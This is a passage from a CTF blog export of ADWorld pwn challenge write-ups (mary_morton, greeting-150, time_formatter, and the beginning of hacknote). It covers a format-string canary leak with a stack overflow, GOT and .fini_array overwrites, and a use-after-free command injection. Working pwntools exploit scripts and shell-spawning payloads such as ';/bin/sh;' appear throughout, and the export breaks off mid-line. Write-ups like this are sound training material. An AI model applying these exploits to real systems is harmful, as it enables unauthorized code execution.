<p>In subfunction 1 (<code>sub_400960</code>), <code>read(0, &amp;buf, 0x100uLL);</code> is the vulnerability, which reads too much and cause stack overflow. The tricky part is to overcome <code>Canary</code> mechanism (aims to prevent stack overflow), and we have seen it in <a href="/2020/07/31/2020-07-31-ADWorld-PWN-Challenge-Area-Write-up-stack2/">ADworld stack2 write-up</a>.<br>But we still have chance, if we can remain the value of canary unchangable, program is also able to run normally. </p>
<p>In subfunction 2 (<code>sub_400960</code>), <code>printf(&amp;buf, &amp;buf);</code> is the format string vulnerability, we can use it to leak <code>Canary</code> content, then rewrite it when performing stack overflow.</p>
<p>First of all, for format string vulnerability part, we have to indentify the order of <code>Canary</code> (input <code>aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</code>):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./mary_morton</span><br><span class="line">Welcome to the battle !</span><br><span class="line">[Great Fairy] level pwned</span><br><span class="line">Select your weapon</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br><span class="line">2</span><br><span class="line">aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line">aaaaaaaa,0x7fff60e31170,0x7f,0x7fd6995815ce,0x1999999999999999,(nil),0x6161616161616161,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0xa70252c70252c</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br></pre></td></tr></table></figure>
<p>From the output we can see our input (<code>buf</code>) is the 6th parameter on the stack, while <code>buf</code> is at the <code>[rbp-90h]</code> and <code>v2</code> (that is <code>Canary</code>) is at the <code>[rbp-8h]</code>, so it needs <code>(0x90-0x8)/0x8 = 0x11 = 17</code> parameters more to get to <code>v2</code> (<code>Canary</code>). So <code>Canary</code> is the <code>17 + 6</code> &#x3D; 23rd parameter. Pyaload should be <code>%23$p</code>.</p>
<p>Then we do stack overflow, see exploit for more detailed action.</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>My former exploits always use <code>recv()</code> to get output and do interaction. While using <code>recvuntil()</code> to replace <code>recv()</code> is a better way and will make exploit script common to both local and remote.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./mary_morton&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47717</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x4008DA</span></span><br><span class="line"><span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;Exit the battle \n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(sh.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> canary</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(canary) + p64(<span class="number">0</span>) + p64(cat_flag_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h2><p>Attachment: <a href="/filehost/apcaw/greeting-150">greeting-150</a><br>Description: None</p>
<p>It’s a format string vulnerability and is related to <code>GOT</code> hijacking, and needs a little tip.</p>
<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file greeting-150</span><br><span class="line">greeting-150: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=beb85611dbf6f1f3a943cecd99726e5e35065a63, not stripped</span><br><span class="line">$ checksec greeting-150</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/greeting-150&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please tell me your name... &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">getnline</span>(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t ignore me ;( &quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;Nice to meet you, %s :)\n&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getnline</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(s, n, stdin);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>It has a classic format string vulnerability, but cannot be exploited by just writting some number to some place. </p>
<p>Since it has <code>Canary</code> and enable the <code>NX</code>, we have to use payload to get shell, then we think about hijacking <code>GOT</code> item. Obviously we have to hijack some item as <code>system_plt</code>, and the <code>/bin/sh</code> still needs to input.</p>
<p>Only one time of input is not enough, we have to control the program flow for more input chances. But we cannot waste this one chance by just leaking <code>ebp</code> or something, so we do not know base address of the stack, right? We cannot overwrite <code>ret addr</code> as <code>main</code> to drop into <code>main</code> loop, but there is another choice: <code>.fini_array</code>.</p>
<p>Before <code>main</code> function, the codes in <code>.init</code> and all func pointers in <code>.init_arrary</code> will be called, and after <code>main</code> the codes in <code>.fini</code> and all func pointers in <code>.fini_arrary</code> will be called. Overwriting 1st item in <code>.fini_array</code> as <code>start</code> will achieve the <code>main</code> loop.<br>The whole process of a program (visit <a class="link"   href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" >linuxProgramStartup<i class="fas fa-external-link-alt"></i></a> for details):<br><img src="/imghost/apcaw/fmt1.png" alt="fmt1.png"></p>
<p>So the first time we input, we hijack <code>.fini</code>; when we back to <code>main</code> we hijack <code>strlen</code> in <code>GOT</code> as <code>system</code>, so that when we input <code>/bin/sh</code> into this program, it happens to be the first parameter of <code>strlen</code> (written as <code>system</code>); then we get shell.</p>
<hr>
<p>Sadly, after trying in this way I found that I can only go back to <code>start</code> once. So we have to overwrite <code>.fini_array</code> and <code>strlen</code> in <code>GOT</code> in one time.</p>
<p>Note: Using <code>gdb</code> or <code>gef</code> to debug it is fine, while using <code>pwngdb</code> and <code>peda</code> will meet an error:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x80485f0</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/greeting-150</span><br><span class="line">[Attaching after process 441 vfork to child process 445]</span><br><span class="line">[New inferior 2 (process 445)]</span><br><span class="line">[Detaching vfork parent process 441 after child exec]</span><br><span class="line">[Inferior 1 (process 441) detached]</span><br><span class="line">process 445 is executing new program: /usr/bin/dash</span><br><span class="line">Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line">[Inferior 2 (process 445) exited normally]</span><br><span class="line">Please tell me your name... pwndbg&gt; </span><br></pre></td></tr></table></figure>
<p>That is because the program forked a child process and it will mess up <code>pwngdb</code> and <code>peda</code>. The way to solve it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; set follow-fork-mode parent</span><br><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x80485f0</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/greeting-150</span><br><span class="line">[Detaching after vfork from child process 436]</span><br><span class="line">Hello, I&#x27;m nao!</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080485f0 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br></pre></td></tr></table></figure>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>The limits for payload are:</p>
<ol>
<li>The length must be less than <code>64</code></li>
<li>Can only return to <code>start</code> once (cant figure it out)</li>
</ol>
<p>With the limit 1, our former gadgets like <code>fmt_str</code> and <code>fmtstr_payload</code> of <code>pwntools</code> cannot meet the needs, so we have to write a more compact payload (with <code>hn</code> to write every double bytes, instead of <code>hnn</code> to write every byte).</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">39474</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;greeting-150&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>] <span class="comment"># 0x8049a54</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># 0x8048490</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 0x80485ed</span></span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;_start&#x27;</span>] <span class="comment"># 0x80484f0</span></span><br><span class="line">init_addr = elf.sym[<span class="string">&#x27;_init&#x27;</span>] <span class="comment"># 0x8048404</span></span><br><span class="line">fini_addr = elf.sym[<span class="string">&#x27;_fini&#x27;</span>] <span class="comment"># 0x8048780</span></span><br><span class="line">init_array = elf.sym[<span class="string">&#x27;__init_array_start&#x27;</span>] <span class="comment"># 0x804992c</span></span><br><span class="line">fini_array = elf.sym[<span class="string">&#x27;__init_array_end&#x27;</span>] <span class="comment"># 0x8049934</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># &quot;Hello, I&#x27;m nao!\nPlease tell me your name... &quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span>+p32(fini_array+<span class="number">2</span>)+p32(strlen_got+<span class="number">2</span>)+p32(strlen_got)+p32(fini_array)</span><br><span class="line">payload += <span class="string">&#x27;%2016c%12$hn%13$hn%31884c%14$hn%96c%15$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>format-string</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (UAF)</title>
    <url>/2020/08/14/2020-08-14-ADWorld-PWN-Challenge-Area-Write-ups-UAF/</url>
    <content><![CDATA[<p>This part is about <code>UAF</code> (Use After Free).</p>
<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time formatter"></a>time formatter</h2><p>Attachment: <a href="/filehost/apcaw/time_formatter">time_formatter</a><br>Description: It is difficult to convert UNIX time to date, so Mary wrote a tool to accomplish this task.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file time_formatter</span><br><span class="line">time_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5afd38988c61546c0035e236ce938af6181e85a6, stripped</span><br><span class="line">$ checksec time_formatter</span><br><span class="line">[*] &#x27;/root/time_formatter&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">getegid</span>();</span><br><span class="line">  <span class="built_in">setresgid</span>(v3, v3, v3);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Mary&#x27;s Unix Time Formatter!&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1) Set a time format.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2) Set a time.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3) Set a time zone.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4) Print your time.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;5) Exit.&quot;</span>);</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">      v4 = stdout;</span><br><span class="line">      <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      <span class="built_in"><span class="keyword">switch</span></span> ( <span class="built_in">sub_400D26</span>() )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          v6 = <span class="built_in">sub_400E00</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v6 = <span class="built_in">sub_400E63</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          v6 = <span class="built_in">sub_400E43</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          v6 = <span class="built_in">sub_400EA3</span>((__int64)v4, (__int64)<span class="string">&quot;&gt; &quot;</span>, v5);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">          v6 = <span class="built_in">sub_400F8F</span>();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v6 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400EA3</code> – “4) Print your time.” :</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400EA3</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(</span><br><span class="line">      (__int64)&amp;command,</span><br><span class="line">      <span class="number">2048LL</span>,</span><br><span class="line">      <span class="number">1LL</span>,</span><br><span class="line">      <span class="number">2048LL</span>,</span><br><span class="line">      (__int64)<span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120,</span><br><span class="line">      (__int64)ptr,</span><br><span class="line">      a3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">getenv</span>(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(stderr, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>, &amp;command, v3);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">system</span>(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400F8F</code> – 5) Exit. :</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_400F8F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">sub_400C7E</span>(ptr);</span><br><span class="line">  <span class="built_in">sub_400C7E</span>(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">16</span>, stdin);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Other subfunctions like: “1) Set a time format.”, “2) Set a time.” and “3) Set a time zone.” please check it by yourselves in IDA.</p>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>To sum up, sub function:</p>
<ol>
<li>Do <code>malloc()</code> (in <code>strdup()</code>) for input and assign it to <code>ptr</code>, special characters are limited.</li>
<li>Receive input and save it to <code>dword_602120</code>.</li>
<li>Do <code>malloc()</code> for input and assign it to <code>value</code>, without character limit.</li>
<li>If <code>ptr</code> is not null, call <code>system()</code> to execute commands (consists of <code>dword_602120</code> and <code>ptr</code>)</li>
<li>first free <code>ptr</code>, then free <code>value</code>, then ask if you exit.</li>
</ol>
<p>In subfunction 4 the command is like <code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;</code>, the <code>ptr</code> will replace <code>%s</code>, so we can input <code>&#39;;/bin/sh;&#39;</code> to do command injection, but the question is <code>&#39;</code> is filtered in subfunction 1.</p>
<p>In subfunction 3 our input to <code>value</code> will not be restricted. In subfunction 5 it just frees pointers but not exit or sets them null. </p>
<p>We can exploit <code>UAF</code> to input payload to <code>value</code> and call <code>system()</code> to execute it as <code>ptr</code>: </p>
<ul>
<li>First malloc a <code>ptr</code> in subfunc 1</li>
<li>Second free it in subfunc 5 (first free <code>ptr</code> then free <code>value</code>)</li>
<li>Then malloc a <code>value</code> in subfunc 3 (using former <code>ptr</code> trunk)</li>
<li>Finally execute system commands in subfunc 4<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3>We can achieve it in terminal:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./time_formatter</span><br><span class="line">Welcome to Marys Unix Time Formatter!</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 1                         &lt;-- first malloc</span><br><span class="line">Format:</span><br><span class="line">Format set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 5                         &lt;-- free</span><br><span class="line">Are you sure you want to exit (y/N)?</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 3                         &lt;-- second malloc</span><br><span class="line">Time zone: &#x27;;/bin/sh;&#x27;</span><br><span class="line">Time zone set.</span><br><span class="line">1) Set a time format.</span><br><span class="line">2) Set a time.</span><br><span class="line">3) Set a time zone.</span><br><span class="line">4) Print your time.</span><br><span class="line">5) Exit.</span><br><span class="line">&gt; 4                         &lt;-- execute command</span><br><span class="line">Your formatted time is:</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
Or write script (use new method – <code>sendlineafter</code>):<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./time_formatter&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>, <span class="number">47869</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;&#x27;;/bin/sh;&#x27;&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><p>Attachment: <a href="/filehost/apcaw/hacknote.zip">hacknote.zip</a><br>Description: None</p>
<p>It’s a harder <code>UAF</code> challenge with a given <code>libc</code> file.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>First unzip it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip hacknote.zip</span><br><span class="line">Archive:  hacknote.zip</span><br><span class="line">  inflating: hacknote/hacknote</span><br><span class="line">  inflating: hacknote/libc_32.so.6</span><br></pre></td></tr></table></figure>
<p>Checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file hacknote/*</span><br><span class="line">hacknote/hacknote:     ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br><span class="line">hacknote/libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped</span><br><span class="line">$ checksec hacknote/hacknote</span><br><span class="line">[*] &#x27;/root/hacknote/hacknote&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">$ ./hacknote/libc_32.so.6</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_8048956</span>();</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">      v0 = <span 